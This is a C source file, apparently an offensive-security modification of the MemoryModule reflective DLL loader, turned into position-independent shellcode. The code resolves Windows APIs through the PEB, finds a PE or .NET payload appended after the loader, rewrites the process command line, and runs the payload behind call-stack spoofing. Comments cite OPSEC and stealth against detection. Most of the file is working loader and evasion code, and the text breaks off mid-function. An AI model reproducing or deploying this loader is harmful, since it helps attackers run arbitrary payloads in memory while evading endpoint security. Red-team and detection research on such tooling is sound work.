/*
 * Memory DLL loading code
 * Version 0.0.4
 *
 * Copyright (c) 2004-2015 by Joachim Bauch / mail@joachim-bauch.de
 * http://www.joachim-bauch.de
 *
 * The contents of this file are subject to the Mozilla Public License Version
 * 2.0 (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 * http://www.mozilla.org/MPL/
 *
 * Software distributed under the License is distributed on an "AS IS" basis,
 * WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License
 * for the specific language governing rights and limitations under the
 * License.
 *
 * The Original Code is MemoryModule.c
 *
 * The Initial Developer of the Original Code is Joachim Bauch.
 *
 * Portions created by Joachim Bauch are Copyright (C) 2004-2015
 * Joachim Bauch. All Rights Reserved.
 *
 *
 * THeller: Added binary search in MemoryGetProcAddress function
 * (#define USE_BINARY_SEARCH to enable it).  This gives a very large
 * speedup for libraries that exports lots of functions.
 *
 * These portions are Copyright (C) 2013 Thomas Heller.
 * 
 * Maxime de Caumia Baillenx.: Made the code position-independent (PIC), simplified it for
 * proof-of-concept usage, added command line support, and implemented
 * evasion techniques to improve stealth.
 *
 * These portions are Copyright (C) 2025 Maxime de Caumia Baillenx.
 */

#include <windows.h>
#include <winnt.h>
#include <stddef.h>
#include <tchar.h>
#include <intrin.h>


#ifdef DEBUG_OUTPUT
#include <stdio.h>
#endif


#ifndef IMAGE_SIZEOF_BASE_RELOCATION
// Vista SDKs no longer define IMAGE_SIZEOF_BASE_RELOCATION!?
#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
#endif


#ifdef _WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif


#include "MemoryModule.h"
#include "helpers.h"


#include "../common/peb.h"


struct ExportNameEntry {
    LPCSTR name;
    WORD idx;
};


typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
typedef int (WINAPI *ExeEntryProc)(void);


typedef struct {
    PIMAGE_NT_HEADERS headers;
    unsigned char *codeBase;
    HCUSTOMMODULE *modules;
    int numModules;
    BOOL initialized;
    BOOL isDLL;
    BOOL isRelocated;
    INSTANCE* inst;

    struct ExportNameEntry *nameExportsTable;
    ExeEntryProc exeEntry;
    DWORD pageSize;

    PRUNTIME_FUNCTION pdataStart;
    DWORD pdataSize;

} MEMORYMODULE, *PMEMORYMODULE;


typedef struct {
    LPVOID address;
    LPVOID alignedAddress;
    SIZE_T size;
    DWORD characteristics;
    BOOL last;
} SECTIONFINALIZEDATA, *PSECTIONFINALIZEDATA;


//
// All the win API used during the loading process
// OPSEC -> those API will come from a not backed up memory region if call directly - they come from a shellcode directly
// to avoid that we can use a thread pool proxy call
//
static inline void* MM_VirtualAlloc(INSTANCE* inst, void* pAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    void* result = inst->api.VirtualAlloc(pAddress, dwSize, flAllocationType, flProtect);
    return result;
}


static inline BOOL MM_VirtualProtect(INSTANCE* inst, void* pAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    BOOL result = inst->api.VirtualProtect(pAddress, dwSize, flNewProtect, lpflOldProtect);
    return result;
}


static inline HMODULE MM_LoadLibraryA(INSTANCE* inst, LPCSTR lpLibFileName)
{
    HMODULE result = inst->api.LoadLibraryA(lpLibFileName);
    return result;
}


static inline BOOL MM_VirtualFree(INSTANCE* inst, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
    BOOL result = inst->api.VirtualFree(lpAddress, dwSize, dwFreeType);
    return result;
}


static inline HMODULE MM_GetModuleHandleA(INSTANCE* inst, LPCSTR lpModuleName)
{
    HMODULE hModule = inst->api.GetModuleHandleA(lpModuleName);
    return hModule;
}


static inline FARPROC MM_GetProcAddress(INSTANCE* inst, HMODULE hModule, LPCSTR lpProcName)
{
    FARPROC pProcAddress = inst->api.GetProcAddress(hModule, lpProcName);
    return pProcAddress;
}


static inline void* MM_GetCommandLineA(INSTANCE* inst)
{
    void* ptr = inst->api.GetCommandLineA();
    return ptr;
}


static inline HANDLE MM_GetCurrentProcess(INSTANCE* inst)
{
    if (!inst || !inst->api.GetCurrentProcess)
        return NULL;
    return inst->api.GetCurrentProcess();
}


static inline BOOL MM_FlushInstructionCache(INSTANCE* inst, HANDLE process, LPCVOID baseAddress, SIZE_T size)
{
    if (!inst || !inst->api.FlushInstructionCache)
        return FALSE;
    return inst->api.FlushInstructionCache(process, baseAddress, size);
}


static inline PVOID MM_AddVectoredExceptionHandler(INSTANCE* inst, ULONG first, PVECTORED_EXCEPTION_HANDLER handler)
{
    if (!inst || !inst->api.AddVectoredExceptionHandler)
        return NULL;

        #ifdef DEBUG_OUTPUT
printf("AddVectoredExceptionHandler\n");
#endif


    return inst->api.AddVectoredExceptionHandler(first, handler);

    
}


static inline ULONG MM_RemoveVectoredExceptionHandler(INSTANCE* inst, PVOID handle)
{
    if (!inst || !inst->api.RemoveVectoredExceptionHandler)
        return 0;
    return inst->api.RemoveVectoredExceptionHandler(handle);
}


static __forceinline PVOID MmReadArbitraryUserPointer(void)
{
#ifdef _WIN64
    return (PVOID)__readgsqword(0x28);
#else
    return (PVOID)__readfsdword(0x14);
#endif
}

static __forceinline void MmWriteArbitraryUserPointer(PVOID value)
{
#ifdef _WIN64
    __writegsqword(0x28, (unsigned __int64)(ULONG_PTR)value);
#else
    __writefsdword(0x14, (unsigned long)(ULONG_PTR)value);
#endif
}

static __forceinline INSTANCE* MmGetThreadInstance(void)
{
    return (INSTANCE*)MmReadArbitraryUserPointer();
}

static inline VOID MM_ExitThread(INSTANCE* inst, DWORD exitCode)
{
    if (inst && inst->api.ExitThread)
        inst->api.ExitThread(exitCode);
}


static inline VOID MM_ExitProcess(INSTANCE* inst, UINT exitCode)
{
    if (inst && inst->api.ExitProcess)
        inst->api.ExitProcess(exitCode);
}


static inline VOID MM_Sleep(INSTANCE* inst, DWORD milliseconds)
{
    if (inst && inst->api.Sleep)
        inst->api.Sleep(milliseconds);
}


static BOOL InstallExitVEH(INSTANCE* inst);
static void RemoveExitVEH(INSTANCE* inst);
static DWORD HandleExitBehavior(void);
static DWORD WINAPI AfterExeContinuation(LPVOID parameter);


//
// Find the pattern that start a module "MZ" for standard PE files, but could be custom
//
static inline PVOID FindModule(char* startAdd, ULONG size, char* pattern)
{
    for (ULONG x = 0; x < size - 1; x++) 
    {
        if (startAdd[x] == pattern[0] && startAdd[x + 1] == pattern[1])
        {
            // printf("Found module at %u\n", x);

            return (PVOID)(startAdd + x);
        }
    }

    return NULL;
}


//
// Custom memcpy, memset and memcmp functions, to use when compiling for a shellcode
//

#ifdef DEBUG_OUTPUT
#else

// Do not treat memcpy as an intrinsic; use the function I provide
#pragma function(memcpy)

void* memcpy(void* dst, const void* src, size_t len) 
{
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (len--) 
    {
        *d++ = *s++;
    }
    return dst;
}


#pragma function(memset)

void* memset(void* ptr, int value, unsigned int num) {
    unsigned char* p = (unsigned char*)ptr;
    while (num--) {
        *p++ = (unsigned char)value;
    }
    return ptr;
}

#pragma function(memcmp)

int memcmp(const void *s1, const void *s2, size_t n)
{
    const unsigned char *p1 = (const unsigned char *)s1;
    const unsigned char *p2 = (const unsigned char *)s2;

    for (size_t i = 0; i < n; i++) 
    {
        if (p1[i] != p2[i]) 
        {
            return (int)p1[i] - (int)p2[i];
        }
    }

    return 0;
}

#endif


//
// Credit to VulcanRaven & LoudSunRun projects
// Call stack spoofing functions
//

#include "Structs.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
#define RBP_OP_INFO 0x5

extern PVOID NTAPI Spoof(PVOID a, ...);


PVOID FindGadget(LPBYTE Module, ULONG Size, char* pattern)
{
    for (int x = 0; x < Size; x++)
    {
        if (memcmp(Module + x, pattern, 2) == 0)
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}


/* Credit to VulcanRaven project for the original implementation of these two*/
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) 
        {
            case UWOP_PUSH_NONVOL:
                // UWOP_PUSH_NONVOL is 8 bytes.
                stackFrame.totalStackSize += 8;
                // Record if it pushes rbp as
                // this is important for UWOP_SET_FPREG.
                if (RBP_OP_INFO == operationInfo)
                {
                    stackFrame.pushRbp = 1;
                    // Record when rbp is pushed to stack.
                    stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                    stackFrame.pushRbpIndex = index + 1;
                }
                break;
            case UWOP_SAVE_NONVOL:
                //UWOP_SAVE_NONVOL doesn't contribute to stack size
                // but you do need to increment index.
                index += 1;
                break;
            case UWOP_ALLOC_SMALL:
                //Alloc size is op info field * 8 + 8.
                stackFrame.totalStackSize += ((operationInfo * 8) + 8);
                break;
            case UWOP_ALLOC_LARGE:
                // Alloc large is either:
                // 1) If op info == 0 then size of alloc / 8
                // is in the next slot (i.e. index += 1).
                // 2) If op info == 1 then size is in next
                // two slots.
                index += 1;
                frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0)
                {
                    frameOffset *= 8;
                }
                else
                {
                    index += 1;
                    frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                }
                stackFrame.totalStackSize += frameOffset;
                break;
            case UWOP_SET_FPREG:
                // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                // that rbp is the expected value (in the frame above) when
                // it comes to spoof this frame in order to ensure the
                // call stack is correctly unwound.
                stackFrame.setsFramePointer = 1;
                break;
            default:
                // printf("[-] Error: Unsupported Unwind Op Code\n");
                status = STATUS_ASSERTION_FAILURE;
                break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    //
    // Not needed for PoC, but could be useful in the future.
    //
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        // printf(" !!!!!!! chained unwind information is present");
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}


ULONG CalculateFunctionStackSizeWrapper(INSTANCE* inst, PVOID ReturnAddress)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = inst->api.RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        // printf("[!] STATUS_ASSERTION_FAILURE\n");
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return status;
}


//
// Cmdline handling
//


void SimpleWideToAnsi(const wchar_t* wide, char* ansi, const int maxLen) 
{
    int i;
    for (i = 0; i < maxLen - 1 && wide[i] != L'\0'; i++) 
    {
        // Assumes ASCII-only characters
        ansi[i] = (char)(wide[i] & 0xFF);
    }
    ansi[i] = '\0';  // Null-terminate the ANSI string
}


void SimpleAnsiToWide(const char* ansi, wchar_t* wide) 
{
    while (*ansi) 
    {
        *wide++ = (wchar_t)(unsigned char)(*ansi++);
    }
    *wide = 0; // null-terminate
}


BOOL SetCommandLineSimple(INSTANCE* inst) 
{
#ifdef _M_IX86 
	PPEB peb = (PEB *) __readfsdword(0x30);
#else
	PPEB peb = (PEB *)__readgsqword(0x60);
#endif

    if (!peb || !peb->ProcessParameters) 
        return FALSE;

    HMODULE hMod = MM_LoadLibraryA(inst, (char*)inst->sKernelBaseDLL);
    
#ifdef DEBUG_OUTPUT
    printf("hMod: %p\n", hMod);
#endif

    if (!hMod) 
        return FALSE;

    // Parse PE headers
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS old_header;
    PIMAGE_SECTION_HEADER section;
    dos_header = (PIMAGE_DOS_HEADER)hMod;    
    old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(hMod))[dos_header->e_lfanew];	
    section = IMAGE_FIRST_SECTION(old_header);

#ifdef DEBUG_OUTPUT
    printf("PE Headers: e_magic=%x, e_lfanew=%x, NumberOfSections=%d\n", dos_header->e_magic, dos_header->e_lfanew, old_header->FileHeader.NumberOfSections);
#endif

    // Find the .data section
    DWORD_PTR dataStart = 0, dataSize = 0;
    for (WORD i = 0; i < old_header->FileHeader.NumberOfSections; i++, section++) 
    {
        if (memcmp(section->Name, inst->sDataSec, 5) == 0) 
        {
            dataStart = (DWORD_PTR)hMod + section->VirtualAddress;
            dataSize  = section->Misc.VirtualSize;
            break;
        }
    }

    if (!dataStart) 
        return FALSE;

    // Get actual current command lines
    LPWSTR curW = peb->ProcessParameters->CommandLine.Buffer;   //inst->api.GetCommandLineW();
    LPSTR  curA = MM_GetCommandLineA(inst);                     // The ANSI version (GetCommandLineA()) is typically generated on-demand by converting the wide string (W) to ANSI when the API is called.

    LPCWSTR newCmdLine = (LPCWSTR)inst->sCmdLine;

#ifdef DEBUG_OUTPUT
    printf("Setting command line to: %ws\n", newCmdLine);
    printf("CommandLine W: %ws\n", curW);
    printf("CommandLine A: %s\n", curA);

    printf("CommandLine W: %p\n", curW);
    printf("CommandLine A: %p\n", curA);
#endif

    // Allocate new strings
    size_t lenW = wcslen(newCmdLine) + 1;
    size_t lenA = lenW; // Assuming 1:1 mapping for simplicity, could be adjusted for different encodings

    LPWSTR newW = (LPWSTR) MM_VirtualAlloc(inst, NULL, lenW * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPSTR  newA = (LPSTR) MM_VirtualAlloc(inst, NULL, lenA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#ifdef DEBUG_OUTPUT
    // printf("lenW: %zu, lenA: %zu\n", lenW, lenA);
#endif

    memcpy(newW, newCmdLine, lenW * sizeof(WCHAR));
    SimpleWideToAnsi(newCmdLine, newA, lenA);
    
    // Scan .data section for matching wchar_t*/char* and patch them
    for (DWORD_PTR i = dataStart; i < dataStart + dataSize - sizeof(PVOID); i += sizeof(PVOID)) 
    {
        PVOID* ptr = (PVOID*)i;
        if (*ptr == (PVOID)curW) 
        {
#ifdef DEBUG_OUTPUT
            printf("-> FOUND CommandLine W: %p\n", (PVOID)i);
#endif
            *ptr = newW;
        } 
        else if (*ptr == (PVOID)curA) 
        {
#ifdef DEBUG_OUTPUT
            printf("-> FOUND CommandLine A: %p\n", (PVOID)i);
#endif
            *ptr = newA;
        }
    }

    return TRUE;
}


typedef void (*LoaderDotNetFunction)(void* data, int size, char* argument);
typedef void (*StandardEmptyFunction)();


//
// Entry point
//


int Loader(INSTANCE* inst)
{		
	GetProcAddress_t pGetProcAddress;
	GetModuleHandleA_t pGetModuleHandle;
	HMODULE moduleKernel32;
	
	moduleKernel32 = hlpGetModuleHandle((wchar_t*)inst->wsKernel32DLL);

    pGetProcAddress = (GetProcAddress_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetProcAddress);
    pGetModuleHandle = (GetModuleHandleA_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetModuleHandleA);

    // inst is RX and we need a RW region so we relocate inst
    VirtualAlloc_t pVirtualAlloc;
    pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualAlloc);
    char* newInst = pVirtualAlloc(NULL, sizeof(INSTANCE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    char* oldInst = (char*)inst;
    for(int i=0; i<sizeof(INSTANCE); i++)
	    newInst[i] = oldInst[i];
    inst = (INSTANCE*)newInst;

    inst->api.GetProcAddress = pGetProcAddress;
	inst->api.GetModuleHandleA = pGetModuleHandle;
    inst->api.VirtualAlloc = pVirtualAlloc;
    inst->api.LoadLibraryA = (LoadLibraryA_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sLoadLibraryA);
    inst->api.VirtualFree = (VirtualFree_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualFree);
    inst->api.VirtualProtect = (VirtualProtect_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sVirtualProtect);
    inst->api.GetCommandLineA = (GetCommandLineA_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetCommandLineA);
    inst->api.RtlAddFunctionTable = (RtlAddFunctionTable_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sRtlAddFunctionTable);
    inst->api.Sleep = (Sleep_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sSleep);


    inst->api.AddVectoredExceptionHandler = (AddVectoredExceptionHandler_t)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sAddVectoredExceptionHandler));
    inst->api.RemoveVectoredExceptionHandler = (RemoveVectoredExceptionHandler_t)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRemoveVectoredExceptionHandler));
    inst->api.ExitThread = (ExitThread_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sExitThread);
    inst->api.ExitProcess = (ExitProcess_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sExitProcess);
    inst->api.FlushInstructionCache = (FlushInstructionCache_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sFlushInstructionCache);
    inst->api.GetCurrentProcess = (GetCurrentProcess_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sGetCurrentProcess);
	
    // For shellcode debug only
    // HMODULE msvcrt = inst->api.LoadLibraryA(inst->sMsvcrtDLL);
    // inst->api.Printf = (printf_t)pGetProcAddress(msvcrt, inst->sPrintf);
    // inst->api.Printf((char*)inst->sDebug);

#ifdef DEBUG_OUTPUT
    printf("inst->api.GetProcAddress %p\n", inst->api.GetProcAddress);
    printf("inst->api.GetModuleHandleA %p\n", inst->api.GetModuleHandleA);
    printf("inst->api.VirtualAlloc %p\n", inst->api.VirtualAlloc);
    printf("inst->api.LoadLibraryA %p\n", inst->api.LoadLibraryA);
    printf("inst->api.VirtualFree %p\n", inst->api.VirtualFree);
    printf("inst->api.VirtualProtect %p\n", inst->api.VirtualProtect);
    printf("inst->api.GetCommandLineA %p\n", inst->api.GetCommandLineA);
    printf("inst->api.RtlAddFunctionTable %p\n", inst->api.RtlAddFunctionTable);

    printf("inst->api.Sleep %p\n", inst->api.Sleep);
    printf("inst->api.AddVectoredExceptionHandler %p\n", inst->api.AddVectoredExceptionHandler);
    printf("inst->api.RemoveVectoredExceptionHandler %p\n", inst->api.RemoveVectoredExceptionHandler);
    printf("inst->api.FlushInstructionCache %p\n", inst->api.FlushInstructionCache);
#endif

    // search for the start of the module
    void* moduleAddress = NULL;

    char* startAdd = (char*)(void*)Loader;
    moduleAddress = FindModule(startAdd + inst->loaderSize, 100, (char*)inst->sMagicBytes);

#ifdef DEBUG_OUTPUT
    if(inst->ptrModuleTst)
    {   
        printf("inst->ptrModuleTst %p\n", inst->ptrModuleTst);
        moduleAddress = inst->ptrModuleTst;
    }
#endif

    if(!moduleAddress)
        return 0;

    //
    // LoudSunRun
    //
    inst->api.RtlLookupFunctionEntry = (RtlLookupFunctionEntry_t)hlpGetProcAddress(moduleKernel32, (char*)inst->sRtlLookupFunctionEntry);
    PVOID ReturnAddress = NULL;
    PRM p = { 0 };
    PRM ogp = { 0 };
    NTSTATUS status = STATUS_SUCCESS;

    p.trampoline = FindGadget((LPBYTE)moduleKernel32, 0x200000, (char*)inst->sGadget);

    ReturnAddress = (PBYTE)(inst->api.GetProcAddress(moduleKernel32, (char*)inst->sBaseThreadInitThunk)) + 0x14; // Would walk export table but am lazy
    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
    p.BTIT_retaddr = ReturnAddress;

    ReturnAddress = (PBYTE)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRtlUserThreadStart)) + 0x21;
    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
    p.RUTS_retaddr = ReturnAddress;

    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, p.trampoline);
    
    //
    // DotNet
    //
    if(inst->isDotNet)
    {
        // Find the .NET module after the dotnet loader module
        void* dotnetModule = NULL;
        dotnetModule = FindModule((char*)(void*)moduleAddress+inst->dotnetLoaderSize, 100, (char*)inst->sMagicBytes);

#ifdef DEBUG_OUTPUT
        // in case of debug the module will not be following the loader, because we are not in a shellcode
        if(inst->ptrDotNetModuleTst)
        {   
            printf("inst->ptrDotNetModuleTst %p\n", inst->ptrDotNetModuleTst);
            dotnetModule = inst->ptrDotNetModuleTst;
        }
#endif

        if(!dotnetModule)
        {
            return 0; 
        }

        // Load module
        HMEMORYMODULE moduleHandle = MemoryLoadLibrary(inst, moduleAddress, inst->dotnetLoaderSize);
        if (!moduleHandle) 
        {
            return 0; 
        }

        void* func = MemoryGetProcAddress(inst, moduleHandle, inst->sdllMethode);

        // LoaderDotNetFunction _loaderDotNetFunction = (LoaderDotNetFunction)func;
        // _loaderDotNetFunction(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine);

        InstallExitVEH(inst);

        Spoof(dotnetModule, inst->dotnetModuleSize, inst->sCmdLine, NULL, &p, func, (PVOID)0);

        HandleExitBehavior();
        return 0;
    }
    //
    // Unmanaged code
    //
    else
    {   
        //
        // Exe
        //
        if(!inst->isDll)
        {
#ifdef DEBUG_OUTPUT
            printf("SetCommandLineSimple\n");
#endif

            BOOL err = SetCommandLineSimple(inst);
            if (!err) 
            {
                return 0; 
            }

#ifdef DEBUG_OUTPUT
            printf("MemoryLoadLibrary\n");
#endif
            // Load module
            HMEMORYMODULE moduleHandle = MemoryLoadLibrary(inst, moduleAddress, inst->moduleSize);
            if (!moduleHandle) 
            {
                return 0; 
            }
                
#ifdef DEBUG_OUTPUT
            printf("MemoryCallEntryPoint\n");
#endif

            PMEMORYMODULE module = (PMEMORYMODULE)moduleHandle;
	
            if (module == NULL || module->isDLL || module->exeEntry == NULL || !module->isRelocated) 
                return 0;

            // module->exeEntry();

#ifdef DEBUG_OUTPUT
            // check if stack unwinding is supported
            DWORD64 imageBase = 0;
            PRUNTIME_FUNCTION fn = RtlLookupFunctionEntry((DWORD64)module->exeEntry, &imageBase, NULL);
            if (fn != NULL) {
                printf("RUNTIME_FUNCTION found! BeginAddress: 0x%X\n", fn->BeginAddress);
            } else {
                printf("No unwind info found — stack walk won't work.\n");
            }
#endif

            // __debugbreak();
            InstallExitVEH(inst);

            Spoof(NULL, NULL, NULL, NULL, &p, module->exeEntry, (PVOID)0);

            HandleExitBehavior();
            return 0;
        }
        //
        // DLL
        //
        else
        {
            // Load module
            HMEMORYMODULE moduleHandle = MemoryLoadLibrary(inst, moduleAddress, inst->moduleSize);
            if (!moduleHandle) 
            {
                return 0; 
            }

            PMEMORYMODULE module = (PMEMORYMODULE)moduleHandle;

            void* func = MemoryGetProcAddress(inst, moduleHandle, inst->sdllMethode);
            // StandardEmptyFunction _func = (StandardEmptyFunction)func;
            // _func();

#ifdef DEBUG_OUTPUT
            // check if stack unwinding is supported
            DWORD64 imageBase = 0;
            PRUNTIME_FUNCTION fn = RtlLookupFunctionEntry((DWORD64)func, &imageBase, NULL);
            if (fn != NULL) {
                printf("RUNTIME_FUNCTION found! BeginAddress: 0x%X\n", fn->BeginAddress);
            } else {
                printf("No unwind info found — stack walk won't work.\n");
            }
#endif

            // __debugbreak();
            InstallExitVEH(inst);

            Spoof(NULL, NULL, NULL, NULL, &p, func, (PVOID)0);

            HandleExitBehavior();
            return 0;
        }
    }

        return 0;
}


#define GET_HEADER_DICTIONARY(module, idx)  &(module)->headers->OptionalHeader.DataDirectory[idx]


static inline uintptr_t AlignValueDown(uintptr_t value, uintptr_t alignment) 
{
    return value & ~(alignment - 1);
}


static inline LPVOID AlignAddressDown(LPVOID address, uintptr_t alignment) 
{
    return (LPVOID) AlignValueDown((uintptr_t) address, alignment);
}


static inline size_t AlignValueUp(size_t value, size_t alignment) 
{
    return (value + alignment - 1) & ~(alignment - 1);
}


static inline void* OffsetPointer(void* data, ptrdiff_t offset) 
{
    return (void*) ((uintptr_t) data + offset);
}


static inline BOOL CheckSize(size_t size, size_t expected) 
{
    if (size < expected) 
    {
        // SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return TRUE;
}


static inline BOOL CopySections(INSTANCE* inst ,const unsigned char *data, size_t size, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module)
{
    int i, section_size;
    unsigned char *codeBase = module->codeBase;
    unsigned char *dest;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
    for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++) 
    {
        if (section->SizeOfRawData == 0) 
        {
            // section doesn't contain data in the dll itself, but may define
            // uninitialized data
            section_size = old_headers->OptionalHeader.SectionAlignment;
            if (section_size > 0) {
                dest = codeBase + section->VirtualAddress;
                if (dest == NULL) 
                {
                    return FALSE;
                }

                // Always use position from file to support alignments smaller
                // than page size (allocation above will align to page size).
                dest = codeBase + section->VirtualAddress;
                // NOTE: On 64bit systems we truncate to 32bit here but expand
                // again later when "PhysicalAddress" is used.
                section->Misc.PhysicalAddress = (DWORD) ((uintptr_t) dest & 0xffffffff);
                // memset(dest, 0, section_size);
				__stosb(dest, 0, section_size);
            }

            // section is empty
            continue;
        }

        if (!CheckSize(size, section->PointerToRawData + section->SizeOfRawData)) 
        {
            return FALSE;
        }

        // commit memory block and copy data from dll
        dest = codeBase + section->VirtualAddress;
        if (dest == NULL) 
        {
            return FALSE;
        }

        // Always use position from file to support alignments smaller
        // than page size (allocation above will align to page size).
        dest = codeBase + section->VirtualAddress;
        memcpy(dest, data + section->PointerToRawData, section->SizeOfRawData);

        // NOTE: On 64bit systems we truncate to 32bit here but expand
        // again later when "PhysicalAddress" is used.
        section->Misc.PhysicalAddress = (DWORD) ((uintptr_t) dest & 0xffffffff);

        if (memcmp(section->Name, inst->sPDataSec, 6) == 0) 
        {

            module->pdataStart = (PRUNTIME_FUNCTION)(codeBase + section->VirtualAddress);
            module->pdataSize = section->SizeOfRawData;

#ifdef DEBUG_OUTPUT
            printf("section->Name %s\n", section->Name);
            printf("module->pdataStart %p\n", dest);
#endif
        }

    }

    return TRUE;
}


static inline SIZE_T GetRealSectionSize(PMEMORYMODULE module, PIMAGE_SECTION_HEADER section) 
{
    DWORD size = section->SizeOfRawData;
    if (size == 0) 
    {
        if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA) 
        {
            size = module->headers->OptionalHeader.SizeOfInitializedData;
        } 
        else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) 
        {
            size = module->headers->OptionalHeader.SizeOfUninitializedData;
        }
    }
    return (SIZE_T) size;
}


static inline BOOL FinalizeSection(INSTANCE* inst, PMEMORYMODULE module, PSECTIONFINALIZEDATA sectionData) 
{
    DWORD protect, oldProtect;
    BOOL executable;
    BOOL readable;
    BOOL writeable;

    if (sectionData->size == 0) 
    {
        return TRUE;
    }

    if (sectionData->characteristics & IMAGE_SCN_MEM_DISCARDABLE) 
    {
        // section is not needed any more and can safely be freed
        if (sectionData->address == sectionData->alignedAddress &&
            (sectionData->last ||
             module->headers->OptionalHeader.SectionAlignment == module->pageSize ||
             (sectionData->size % module->pageSize) == 0)
           ) 
        {
            // Only allowed to decommit whole pages
            MM_VirtualFree(inst, sectionData->address, sectionData->size, MEM_DECOMMIT);
        }
        return TRUE;
    }

    // determine protection flags based on characteristics
    executable = (sectionData->characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    readable =   (sectionData->characteristics & IMAGE_SCN_MEM_READ) != 0;
    writeable =  (sectionData->characteristics & IMAGE_SCN_MEM_WRITE) != 0;

	if(executable && !readable && !writeable)
	{
		protect=PAGE_EXECUTE;
	}
	else if(executable && readable && !writeable)
	{
		protect=PAGE_EXECUTE_READ;
	}
	else if(executable && readable && writeable)
	{
		protect=PAGE_EXECUTE_READWRITE;
	}
	else if(executable && !readable && writeable)
	{
		protect=PAGE_EXECUTE_WRITECOPY;
	}
	else if(!executable && !readable && !writeable)
	{
		protect=PAGE_NOACCESS;
	}
	else if(!executable && readable && !writeable)
	{
		protect=PAGE_READONLY;
	}
	else if(!executable && readable && writeable)
	{
		protect=PAGE_READWRITE;
	}
	else if(!executable && !readable && writeable)
	{
		protect=PAGE_WRITECOPY;
	}
